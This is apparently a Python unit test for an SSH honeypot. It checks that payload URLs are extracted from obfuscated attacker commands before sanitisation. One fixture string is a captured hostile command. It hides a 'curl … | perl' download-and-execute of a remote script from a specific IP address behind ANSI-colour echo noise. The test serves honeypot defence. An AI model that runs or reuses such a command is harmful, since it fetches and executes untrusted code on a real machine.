import unittest
from unittest.mock import MagicMock, patch, ANY
import datetime
from ssh_honeypot.core.command_handler import CommandHandler
from ssh_honeypot.core.database import HoneyDB


class TestPayloadExtractionRealTime(unittest.TestCase):
    def setUp(self):
        self.mock_db = MagicMock(spec=HoneyDB)
        self.mock_llm = MagicMock()
        self.handler = CommandHandler(self.mock_llm, self.mock_db)

        # Mock PayloadManager instance attached to handler
        self.mock_pm = MagicMock()
        self.handler.payload_manager = self.mock_pm

        # Ensure LLM returns a string to avoid TypeError in regex
        self.mock_llm.generate_response.return_value = "Mock LLM Response"

    def test_obfuscated_payload_extraction(self):
        """
        Test that obfuscated commands with embedded URLs trigger payload extraction
        BEFORE sanitization strips critical characters.
        """
        # The specific command from the user report
        cmd = 'echo -e "\\033[0m";echo -ne " \\033[93m[\\033[91m 33/611 \\033[93m] \\033[93m[\\033[97m Executing cmd to \\033[92m107.182.173.173:22 \\033[93m] \\033[96m ";!u curl -sS 147.182.224.216/kias|perl >>/dev/null 2>&1'

        context = {
            "session_id": "sess_123",
            "ip": "1.2.3.4",
            "client_ip": "1.2.3.4",
            "vfs": {},
            "cwd": "/root",
        }

        # Configure PayloadManager mock to return the URL ONLY for the raw command
        expected_url = "http://147.182.224.216/kias"

        def extract_side_effect(text):
            if text == cmd:
                return [expected_url]
            return []

        self.mock_pm.extract_urls.side_effect = extract_side_effect

        # Execute
        self.handler.process_command(cmd, context)

        # Verify extract_urls was called with the raw command
        self.mock_pm.extract_urls.assert_any_call(cmd)

        # Verify queue_payload was called for the TOP-LEVEL command
        self.mock_pm.queue_payload.assert_any_call(
            expected_url,
            "sess_123",
            "1.2.3.4",
            ANY,  # usage of datetime.datetime.now()
            command_text=cmd,
        )


if __name__ == "__main__":
    unittest.main()
